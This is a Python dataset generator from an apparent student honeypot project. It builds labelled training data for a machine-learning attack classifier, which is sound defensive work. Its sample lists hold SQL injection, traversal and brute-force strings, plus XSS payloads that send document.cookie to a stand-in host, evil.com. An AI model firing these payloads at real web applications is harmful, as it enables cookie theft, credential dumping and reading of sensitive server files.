"""
dataset_generator.py  —  Training Dataset Generator
Smart Web Honeypot | FYP01-CS-2530-0463

Combines real captured logs with synthetic attack samples to build
a balanced training dataset for the Random Forest classifier.

This is standard practice in security ML research when real attack
data is limited (referenced in Section 2.5 of report).

Output: logs/training_dataset.csv and logs/synthetic_attacks.jsonl
"""

import json
import csv
import os
import random
from datetime import datetime, timedelta
from feature_extractor import FeatureExtractor

LOGS_FILE         = os.path.join(os.path.dirname(__file__), "logs", "attack_logs.jsonl")
DATASET_FILE      = os.path.join(os.path.dirname(__file__), "logs", "training_dataset.csv")
SYNTHETIC_LOGS    = os.path.join(os.path.dirname(__file__), "logs", "synthetic_attacks.jsonl")


# ── Synthetic payload samples per attack type ────────────────────────────────

SYNTHETIC_SAMPLES = {
    "SQL_INJECTION": [
        "admin' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "' UNION SELECT * FROM users--",
        "1; DROP TABLE users--",
        "' OR 'x'='x",
        "admin' OR '1'='1'/*",
        "UNION ALL SELECT NULL,NULL,NULL--",
        "' AND 1=2 UNION SELECT username,password FROM users--",
        "1 AND SLEEP(5)--",
        "'; EXEC xp_cmdshell('dir')--",
        "' AND BENCHMARK(1000000,MD5(1))--",
        "admin' #",
        "' OR 1=1#",
        "1 UNION SELECT table_name FROM information_schema.tables--",
        "sqlmap payload test",
        "havij test payload",
        "'; INSERT INTO users VALUES('hack','hack')--",
        "' OR EXISTS(SELECT * FROM users)--",
        "admin') OR ('1'='1",
    ],
    "XSS": [
        "<script>alert(1)</script>",
        "<script>document.cookie</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "';alert(1)//",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "document.write('<script>alert(1)</script>')",
        "eval(atob('YWxlcnQoMSk='))",
        "<script>fetch('http://evil.com?c='+document.cookie)</script>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<IMG SRC=\"javascript:alert('XSS')\">",
        "<input onfocus=alert(1) autofocus>",
        "'-alert(1)-'",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<math><mtext></table></math><img src=x onerror=alert(1)>",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "<script>new Image().src='http://evil.com/'+document.cookie</script>",
    ],
    "BRUTE_FORCE": [
        "admin password1",
        "admin 123456",
        "admin admin",
        "root root",
        "admin pass",
        "administrator password",
        "user user123",
        "admin qwerty",
        "test test123",
        "admin letmein",
        "admin welcome",
        "guest guest",
        "admin abc123",
        "admin monkey",
        "admin dragon",
        "admin master",
        "admin shadow",
        "admin sunshine",
        "admin princess",
        "admin football",
    ],
    "DIRECTORY_TRAVERSAL": [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd",
        "/var/www/html/../../../etc/shadow",
        "../../windows/win.ini",
        "../../../boot.ini",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\system32\\",
        "/proc/self/environ",
        "../../.env",
        "../../../var/log/apache2/access.log",
        "/etc/passwd%00",
        "....\\\\....\\\\etc\\\\passwd",
        "%252e%252e%252fetc%252fpasswd",
        "../../../usr/local/etc/passwd",
        "wp-admin/admin.php",
        "phpmyadmin/index.php",
        ".git/config",
        "../../config.php",
        "../../../db_backup.sql",
    ],
}

# User agents per category
UA_MAP = {
    "SQL_INJECTION":       ["sqlmap/1.7", "curl/7.68.0", "python-requests/2.28"],
    "XSS":                 ["Mozilla/5.0 (X11; Linux)", "curl/7.68.0"],
    "BRUTE_FORCE":         ["curl/7.68.0", "Hydra", "python-requests/2.28"],
    "DIRECTORY_TRAVERSAL": ["nikto/2.1.6", "dirbuster/1.0", "curl/7.68.0"],
}

# Threat levels per attack type (RANDOMIZED - not fixed!)
THREAT_LEVELS_MAP = {
    "SQL_INJECTION":       ["LOW", "MEDIUM", "HIGH"],
    "XSS":                 ["LOW", "MEDIUM", "HIGH"],
    "BRUTE_FORCE":         ["MEDIUM", "HIGH"],
    "DIRECTORY_TRAVERSAL": ["LOW", "MEDIUM", "HIGH"],
}

# Attack paths
PATHS = ["/login", "/search", "/admin", "/", "/register", "/profile"]
IPS = ["192.168.56.101", "192.168.56.102", "192.168.56.103", "192.168.56.104", "192.168.56.105"]


class DatasetGenerator:

    def __init__(self):
        self.extractor = FeatureExtractor()
        self.base_time = datetime(2026, 5, 19)  # Start from same date as real logs

    def generate(self, samples_per_class=100):
        """
        Build training dataset combining:
          1. Real logs from attack_logs.jsonl
          2. Synthetic samples per attack class

        Saves to logs/training_dataset.csv and logs/synthetic_attacks.jsonl
        Returns (X, y)
        """
        print("[*] Loading real logs...")
        real_entries = self._load_real_logs()
        print("    Found {} real log entries".format(len(real_entries)))

        print("[*] Generating synthetic samples ({} per class)...".format(samples_per_class))
        synthetic_entries = self._generate_synthetic(samples_per_class)
        print("    Generated {} synthetic entries".format(len(synthetic_entries)))

        # Save synthetic entries to JSONL for reference
        self._save_synthetic_jsonl(synthetic_entries)

        all_entries = real_entries + synthetic_entries
        random.shuffle(all_entries)

        print("[*] Extracting features...")

        X = []
        y = []

        for entry in all_entries:

            features = self.extractor.extract(entry)

            label = entry.get("attack_type", "NORMAL")

            if label in ("NONE", "Page visit", ""):
                label = "NORMAL"

            X.append(features)
            y.append(label)

        self._save_csv(X, y)

        print("[*] Dataset saved to: {}".format(DATASET_FILE))
        print("[*] Synthetic logs saved to: {}".format(SYNTHETIC_LOGS))
        print("[*] Total samples: {}".format(len(X)))

        self._print_class_distribution(y)

        return X, y

    def _load_real_logs(self):
        """
        Load JSONL attack logs.
        """

        entries = []

        try:
            with open(LOGS_FILE, "r", encoding="utf-8") as f:

                for line in f:

                    line = line.strip()

                    if not line:
                        continue

                    try:
                        entries.append(
                            json.loads(line)
                        )

                    except Exception:
                        pass

        except Exception as e:

            print(
                "Warning: Could not load logs: {}".format(e)
            )

        return entries

    def _generate_synthetic(self, samples_per_class):
        """
        Generate synthetic attack entries in exact format of attack_logs.jsonl
        with RANDOMIZED threat levels (not fixed to one level per attack type).
        """

        entries = []
        timestamp = self.base_time

        for attack_type, payloads in SYNTHETIC_SAMPLES.items():

            threat_levels = THREAT_LEVELS_MAP.get(attack_type, ["HIGH"])
            uas = UA_MAP[attack_type]

            for _ in range(samples_per_class):

                payload = random.choice(payloads)

                # Add random noise to some payloads
                if random.random() < 0.3:
                    payload += " " + str(random.randint(1, 999))

                # Determine path and method
                path = random.choice(PATHS)
                method = "POST" if attack_type in ["SQL_INJECTION", "BRUTE_FORCE", "XSS"] else "GET"
                query_string = ""

                # For directory traversal, payload goes in query string
                if attack_type == "DIRECTORY_TRAVERSAL":
                    query_string = payload
                    payload = ""
                    method = "GET"
                    path = "/file"

                # For XSS, payload might go in query string
                if attack_type == "XSS" and random.random() < 0.5:
                    query_string = "q=" + payload
                    payload = ""

                # RANDOMIZE threat level for this specific entry
                threat_level = random.choice(threat_levels)

                # Generate matched rules based on attack type
                matched_rules = self._generate_rules(attack_type, payload)

                # Create entry in EXACT format of attack_logs.jsonl
                entry = {
                    "timestamp": timestamp.isoformat() + "{:06d}".format(random.randint(0, 999999)),
                    "ip": random.choice(IPS),
                    "method": method,
                    "path": path,
                    "query_string": query_string,
                    "user_agent": random.choice(uas),
                    "payload": payload,
                    "payload_len": len(payload),
                    "threat_level": threat_level,  # RANDOMIZED per entry
                    "attack_type": attack_type,
                    "matched_rules": matched_rules
                }

                entries.append(entry)

                # Increment timestamp by random seconds (0-10)
                timestamp = timestamp + timedelta(seconds=random.randint(1, 10))

        return entries

    def _generate_rules(self, attack_type, payload):
        """
        Generate realistic matched_rules based on attack type and payload.
        """

        rules = []

        if attack_type == "SQL_INJECTION":
            if "UNION" in payload:
                rules.append("SQLi: UNION SELECT")
            if "OR" in payload:
                rules.append("SQLi: OR 1=1")
            if "--" in payload or "#" in payload:
                rules.append("SQLi: Comment syntax")
            if "DROP" in payload or "DELETE" in payload:
                rules.append("SQLi: DDL/DML injection")
            if len(payload) > 20:
                rules.append("SQLi: Suspicious payload length")

        elif attack_type == "XSS":
            if "<script" in payload:
                rules.append("XSS: <script> tag")
            if "alert(" in payload:
                rules.append("XSS: alert()")
            if "javascript:" in payload:
                rules.append("XSS: javascript: protocol")
            if "onerror" in payload or "onload" in payload:
                rules.append("XSS: Event handler")
            if "fetch(" in payload or "XMLHttpRequest" in payload:
                rules.append("XSS: Data exfiltration")

        elif attack_type == "BRUTE_FORCE":
            rules.append("Brute Force: Multiple failed attempts")
            if len(payload) > 15:
                rules.append("Brute Force: Suspicious credential length")

        elif attack_type == "DIRECTORY_TRAVERSAL":
            if "../" in payload or "..\\" in payload:
                rules.append("Traversal: Path traversal sequence")
            if "etc/passwd" in payload or "windows/system" in payload:
                rules.append("Traversal: Sensitive file access")

        return rules if rules else []

    def _save_synthetic_jsonl(self, entries):
        """
        Save synthetic entries to JSONL file in attack_logs.jsonl format.
        """
        os.makedirs(os.path.dirname(SYNTHETIC_LOGS), exist_ok=True)

        with open(SYNTHETIC_LOGS, "w", encoding="utf-8") as f:
            for entry in entries:
                f.write(json.dumps(entry) + "\n")

        print("[*] Saved {} synthetic entries to {}".format(len(entries), SYNTHETIC_LOGS))

    def _save_csv(self, X, y):

        os.makedirs(
            os.path.dirname(DATASET_FILE),
            exist_ok=True
        )

        feature_names = (
            self.extractor.get_feature_names()
        )

        with open(
            DATASET_FILE,
            "w",
            newline=""
        ) as f:

            writer = csv.writer(f)

            writer.writerow(
                feature_names + ["label"]
            )

            for features, label in zip(X, y):

                writer.writerow(
                    features + [label]
                )

    def _print_class_distribution(self, y):

        counts = {}

        for label in y:
            counts[label] = (
                counts.get(label, 0) + 1
            )

        print("\n[*] Class distribution:")

        for label, count in sorted(counts.items()):

            print(
                "    {:25s}: {}".format(
                    label,
                    count
                )
            )

if __name__ == "__main__":
    print("[*] Starting dataset generation...")

    generator = DatasetGenerator()
    X, y = generator.generate(samples_per_class=200)

    print("[*] Done.")

